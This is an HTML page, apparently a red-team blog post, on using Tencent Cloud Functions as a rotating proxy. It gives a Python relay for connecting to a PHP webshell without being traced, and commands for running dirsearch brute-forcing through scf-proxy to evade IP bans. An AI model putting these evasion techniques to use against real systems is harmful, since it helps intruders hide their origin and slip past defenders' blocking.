@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>腾讯云函数的三种常见利用方式 - T0x1c</title>
+
+  
+    <meta name="description" content="云函数(变相代理池)的三种常见利用0x01 云函数简介云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码。开发者只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。以下为云函数的几个特点 多种开发环境使用云函数时，只需使用平台支持的语言（Pyth">
+<meta property="og:type" content="article">
+<meta property="og:title" content="腾讯云函数的三种常见利用方式">
+<meta property="og:url" content="https://toxic80l.github.io/post/5bb1bf38/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="云函数(变相代理池)的三种常见利用0x01 云函数简介云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码。开发者只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。以下为云函数的几个特点 多种开发环境使用云函数时，只需使用平台支持的语言（Pyth">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.06.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.47.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.24.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.29.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.48.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.49.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.51.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%883.05.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.28.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.28.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%882.50.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%882.53.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.30.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.36.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.32.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.36.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%882.33.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.00.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.02.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.06.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.08.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.11.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.15.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.24.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.26.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.39.41.png">
+<meta property="article:published_time" content="2021-12-24T01:36:05.000Z">
+<meta property="article:modified_time" content="2021-12-24T02:15:44.322Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="代理">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="云函数">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.06.08.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BA%91%E5%87%BD%E6%95%B0%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 云函数简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%A7%8D%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="toc-text">多种开发环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E5%9C%B0%E9%83%A8%E7%BD%B2"><span class="toc-text">多地部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%89%A7%E8%A1%8C%E6%97%B6%E6%9C%BA"><span class="toc-text">自定义执行时机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%98%B2%E6%BA%AF%E6%BA%90%E8%BF%9E%E6%8E%A5Webshell"><span class="toc-text">0x02 防溯源连接Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BA%91%E5%87%BD%E6%95%B0"><span class="toc-text">创建云函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C"><span class="toc-text">测试效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%B3%A8%E5%85%A5-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E7%88%86%E7%A0%B4%E9%98%B2Ban"><span class="toc-text">0x03 注入&#x2F;目录爆破爆破防Ban</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BA%91%E5%87%BD%E6%95%B0-1"><span class="toc-text">创建云函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C-1"><span class="toc-text">测试效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-C2%E9%9A%90%E8%97%8F"><span class="toc-text">0x04 C2隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BA%91%E5%87%BD%E6%95%B0-2"><span class="toc-text">创建云函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C-2"><span class="toc-text">测试效果</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/">隐藏技术</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2021-12-24T01:36:05.000Z">2021-12-24</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>腾讯云函数的三种常见利用方式</span></h1>
+<h1 id="云函数-变相代理池-的三种常见利用"><a href="#云函数-变相代理池-的三种常见利用" class="headerlink" title="云函数(变相代理池)的三种常见利用"></a>云函数(变相代理池)的三种常见利用</h1><h2 id="0x01-云函数简介"><a href="#0x01-云函数简介" class="headerlink" title="0x01 云函数简介"></a>0x01 云函数简介</h2><p>云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码。开发者只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。以下为云函数的几个特点</p>
+<h3 id="多种开发环境"><a href="#多种开发环境" class="headerlink" title="多种开发环境"></a>多种开发环境</h3><p>使用云函数时，只需使用平台支持的语言（Python、Node.js、PHP、Golang、Java 及 Custom Runtime）编写代码。腾讯云将完全管理底层计算资源，包括服务器 CPU、内存、网络和其他配置/资源维护、代码部署、弹性伸缩、负载均衡、安全升级、资源运行情况监控等。但这也意味着我们无法登录或管理服务器、无法自定义系统和环境。</p>
+<h3 id="多地部署"><a href="#多地部署" class="headerlink" title="多地部署"></a>多地部署</h3><p>云函数自动地在同一地域内的多个可用区部署，同时提供极高的容错性。云函数在执行时将根据请求负载扩缩容，从每天几个请求到每秒数千个请求，都由云函数底层自行伸缩。无需人工配置和介入，只需为运行中的云函数付费，即可满足不同情景下服务的可用性和稳定性。若云函数未运行，则不产生任何费用。</p>
+<h3 id="自定义执行时机"><a href="#自定义执行时机" class="headerlink" title="自定义执行时机"></a>自定义执行时机</h3><p>可以自定义运行云函数的时机，例如，在 COS Bucket 上传时、删除文件时运行云函数、使用 Ckafka 中的消息时运行云函数、应用程序通过 SDK 调用时运行云函数，或指定云函数定期执行。我们可以使用云函数作为 COS 服务的数据处理触发程序轻松实现 IFTTT 逻辑，也可以通过构建灵活的定时自动化任务，用于覆盖手工完成的操作，轻松构建灵活可控的软件架构。</p>
+<h2 id="0x02-防溯源连接Webshell"><a href="#0x02-防溯源连接Webshell" class="headerlink" title="0x02 防溯源连接Webshell"></a>0x02 防溯源连接Webshell</h2><h3 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h3><p>在腾讯云上找到云函数控制面板，在函数服务中选择自定义创建<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.06.08.png" alt="截屏2021-12-07 上午9.06.08"></p>
+<p>函数代码中脚本如下，主要是通过将Webshell地址作为参数传入云函数API中，在云函数服务端脚本中重组Webshell地址以及POST命令内容，将重组后的请求内容转发给Webshel</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#- * -coding: utf - 8 - * -</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geturl</span>(<span class="params">urlstr</span>):</span></span><br><span class="line">    jurlstr = json.dumps(urlstr)</span><br><span class="line">    dict_url = json.loads(jurlstr)</span><br><span class="line">    <span class="keyword">return</span> dict_url[<span class="string">&#x27;u&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    url = geturl(event[<span class="string">&#x27;queryString&#x27;</span>])</span><br><span class="line">    host = urlsplit(url).netloc</span><br><span class="line">    postdata = event[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line">    headers = event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    headers[<span class="string">&quot;HOST&quot;</span>] = host</span><br><span class="line">    resp = requests.post(url, data = postdata, headers = headers,verify = <span class="literal">False</span>)</span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">False</span>, </span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>, </span><br><span class="line">        <span class="string">&quot;headers&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html;charset=&#x27;</span> + resp.apparent_encoding</span><br><span class="line">        &#125;</span><br><span class="line">        , <span class="string">&quot;body&quot;</span>: resp.text</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.47.13.png" alt="截屏2021-12-07 下午2.47.13"></p>
+<p>设置触发器为API网关触发<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.24.02.png" alt="截屏2021-12-07 上午9.24.02"><br>设置完成后如下，保存访问路径<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8A%E5%8D%889.29.53.png" alt="截屏2021-12-07 上午9.29.53"></p>
+<h3 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h3><p>那么我们在VPS上搭建一个简单的php环境，其中放置一个一句话木马，通过蚁剑进行连接，将木马地址和api调用地址结合后如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https://service-xx-xx.xx.xx.tencentcs.com/release/webshell_bypass?u=http://x.x.x.x:888/phpmyadmin/mac.php</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.48.19.png" alt="截屏2021-12-07 下午2.48.19"><br>成功连接蚁剑<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.49.44.png" alt="截屏2021-12-07 下午2.49.44"><br>在日志查询中也能看到调用成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%882.51.00.png" alt="截屏2021-12-07 下午2.51.00"><br>在 VPS 上查看连接地址，可以发现连接IP地址都是不同的，说明云函数执行成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/wwwlogs/access.log</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%883.05.34.png" alt="截屏2021-12-07 下午3.05.34"></p>
+<h2 id="0x03-注入-目录爆破爆破防Ban"><a href="#0x03-注入-目录爆破爆破防Ban" class="headerlink" title="0x03 注入/目录爆破爆破防Ban"></a>0x03 注入/目录爆破爆破防Ban</h2><h3 id="创建云函数-1"><a href="#创建云函数-1" class="headerlink" title="创建云函数"></a>创建云函数</h3><p>这里可以哈希安全团队公开的SCF-Proxy来实现，第一次看到Scf-Proxy的概念的应该是学蚁致用的作者，通过客户端监听获取请求并且组装API请求，服务端云函数解析且重组API请求，通过SCF-Proxy不光可以实现代理http请求，也可以代理https请求(类似Burp中间人监听的方式)。</p>
+<p><em><strong>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashsecteam/scf-proxy">https://github.com/hashsecteam/scf-proxy</a></strong></em></p>
+<p>下载下来然后利用Golang编译客户端和服务端，开始编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 make</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.28.21.png" alt="截屏2021-12-22 上午3.28.21"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.28.49.png" alt="截屏2021-12-22 上午3.28.49"></p>
+<p>把客户端编译成 MACOS 版本使用，选择自定义创建，但是这里要选择 Go 而不是默认的python，并将执行方法改为 server，且选择本地上传 zip，将 server.zip 上传<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%882.50.33.png" alt="截屏2021-12-22 上午2.50.33"><br>选择 API 网关管理，创建完成后来到<code>触发管理</code>获取 API 地址<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%882.53.03.png" alt="截屏2021-12-22 上午2.53.03"></p>
+<h3 id="测试效果-1"><a href="#测试效果-1" class="headerlink" title="测试效果"></a>测试效果</h3><p>在客户端开启监听10086端口，设置地址为云函数地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./client -port 10086 https://service-xxx-xx.xx.xx.tencentcs.com/release/proxy_bypass</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.30.01.png" alt="截屏2021-12-22 上午3.30.01"><br>在 dirsearch 中设置 http 代理爆破目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://x.x.x.x:888/phpmyadmin_xxxxx -e php --proxy=http://127.0.0.1:10086 --max-rate=10</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.36.27.png" alt="截屏2021-12-22 上午3.36.27"><br>在日志查询中也能看到调用成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.32.47.png" alt="截屏2021-12-22 上午3.32.47"><br>在 VPS 上查看连接地址，可以发现连接IP地址都是不同的，说明云函数执行成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/wwwlogs/access.log</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8A%E5%8D%883.36.59.png" alt="截屏2021-12-22 上午3.36.59"></p>
